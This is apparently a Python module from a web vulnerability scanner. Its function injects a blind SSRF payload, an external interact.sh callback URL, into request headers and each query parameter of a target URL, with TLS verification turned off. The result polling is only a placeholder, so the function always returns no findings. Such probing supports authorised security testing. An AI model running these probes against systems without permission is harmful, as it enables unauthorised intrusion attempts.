import requests
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse
from scanners.utils import GLOBAL_COOKIE, GLOBAL_BEARER

def run_oob_ssrf(url):
    """
    Blind OOB SSRF via Interactsh placeholder logic.
    Injects tracking payloads into headers and parameters.
    """
    findings = []
    headers = {
        "X-Forwarded-For": "http://blindssrf.interact.sh",
        "Referer": "http://blindssrf.interact.sh",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    if GLOBAL_COOKIE: headers["Cookie"] = GLOBAL_COOKIE
    if GLOBAL_BEARER: headers["Authorization"] = f"Bearer {GLOBAL_BEARER}"

    try:
        requests.get(url, headers=headers, timeout=5, verify=False)
    except: pass
    
    # Payload injection in params
    if "?" in url:
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        for i, (k, v) in enumerate(params):
            test_params = params.copy()
            test_params[i] = (k, "http://blindssrf.interact.sh")
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(test_params), parsed.fragment))
            try:
                requests.get(test_url, headers=headers, timeout=5, verify=False)
            except: pass

    # Actual interactsh polling logic would go here in a dedicated background worker
    return findings
